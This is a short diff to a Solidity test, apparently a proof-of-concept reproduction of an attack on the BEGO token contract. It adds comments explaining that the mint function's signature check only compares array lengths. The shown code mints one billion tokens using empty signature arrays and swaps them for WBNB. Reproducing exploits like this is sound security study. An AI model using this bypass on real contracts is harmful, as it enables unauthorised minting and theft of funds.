@@ -30,6 +30,8 @@ contract ContractTest is DSTest{
         bytes32 [] memory _r = new bytes32[](0);
         bytes32 [] memory _s = new bytes32[](0);
         uint8 [] memory _v = new uint8[](0);
+        // checkSignParams in modifier isSigned only check for _r, _s, _v length
+        // attackers can bypass this by passing empty _r, _s, _v
         BEGO.mint(1_000_000_000 * 1e18, "t", address(this), _r, _s, _v);
         BEGOToWBNB();
 
